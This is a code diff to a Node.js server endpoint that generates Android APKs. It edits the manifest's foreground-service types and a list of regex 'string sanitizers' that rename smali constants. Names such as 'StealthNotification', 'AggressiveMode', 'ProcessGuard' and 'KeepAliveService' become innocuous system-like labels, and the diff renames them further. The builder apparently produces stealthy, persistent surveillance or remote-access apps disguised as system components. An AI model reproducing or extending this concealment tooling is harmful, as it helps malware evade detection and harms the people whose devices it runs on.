@@ -393,7 +393,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
                 manifestContent = manifestContent.replace(/foregroundServiceType="specialUse[^"]*"/, `foregroundServiceType="${fgsTypes}"`);
                 fs.writeFileSync(manifestPath, manifestContent);
-                console.log(`[APK] KeepAliveService FGS types: ${fgsTypes}`);
+                console.log(`[APK] SyncService FGS types: ${fgsTypes}`);
 
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
                 let servicesBlock = '';
@@ -468,15 +468,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 .map(d => path.join(workDir, d.name));
 
             const stringSanitizers = [
-                [/const-string ([v0-9p]+), "HexaCore[^"]*"/g, 'const-string $1, "SysCore"'],
-                [/const-string ([v0-9p]+), "Hexa Core[^"]*"/g, 'const-string $1, "System Core"'],
-                [/const-string ([v0-9p]+), "KeepAliveService"/g, 'const-string $1, "SysWorkerService"'],
-                [/const-string ([v0-9p]+), "AggressiveMode"/g, 'const-string $1, "PersistenceMode"'],
-                [/const-string ([v0-9p]+), "StealthNotification"/g, 'const-string $1, "SysNotification"'],
-                [/const-string ([v0-9p]+), "StealthNotificationHelper"/g, 'const-string $1, "SysNotificationHelper"'],
-                [/const-string ([v0-9p]+), "ProcessGuard"/g, 'const-string $1, "ProcessMonitor"'],
-                [/const-string ([v0-9p]+), "WatchdogReceiver"/g, 'const-string $1, "SystemWatchdog"'],
-                [/const-string ([v0-9p]+), "KeepAlive"/g, 'const-string $1, "SysWorker"'],
+                [/const-string ([v0-9p]+), "SyncService"/g, 'const-string $1, "SysWorkerService"'],
+                [/const-string ([v0-9p]+), "AppLifecycle[^"]*"/g, 'const-string $1, "LifecycleMonitor"'],
+                [/const-string ([v0-9p]+), "ServiceScheduler"/g, 'const-string $1, "SystemScheduler"'],
+                [/const-string ([v0-9p]+), "AudioSession[^"]*"/g, 'const-string $1, "MediaSession"'],
+                [/const-string ([v0-9p]+), "NotifStyle[^"]*"/g, 'const-string $1, "StyleConfig"'],
+                [/const-string ([v0-9p]+), "AppSync[^"]*"/g, 'const-string $1, "DataSync"'],
                 [/const-string ([v0-9p]+), "DataSyncHelper"/g, 'const-string $1, "SyncManager"'],
                 [/const-string ([v0-9p]+), "SocketManager"/g, 'const-string $1, "ConnectionManager"'],
                 [/const-string ([v0-9p]+), "gallery.eye"/g, 'const-string $1, "app.service"'],
